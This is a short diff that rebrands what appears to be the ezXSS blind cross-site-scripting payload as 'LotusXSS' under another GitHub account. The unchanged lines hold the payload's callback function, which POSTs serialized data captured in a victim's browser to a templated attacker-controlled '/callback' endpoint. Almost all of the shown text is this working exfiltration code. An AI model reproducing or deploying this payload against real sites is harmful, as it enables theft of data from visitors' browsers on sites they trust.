@@ -1,5 +1,5 @@
-// github.com/ssl/ezXSS
-// ezXSS {{version}}
+// github.com/teststudent311/LotusXSS
+// LotusXSS {{version}}
 
 function ez_n(e){return void 0 !==e?e:''}
 function ez_cb(e,t){var n,o="{{protocol}}://{{domain}}/callback";window.XMLHttpRequest?((n=new XMLHttpRequest).open("POST",o,!0),n.setRequestHeader("Content-type","text/plain"),n.timeout=6e4):((n=new ActiveXObject("Microsoft.XMLHTTP")).open("POST",o,!0),n.setRequestHeader("Content-type","application/x-www-form-urlencoded")),n.onreadystatechange=function(){4===n.readyState&&200===n.status&&null!==t&&t(n.responseText)},n.send(ez_se(e))}
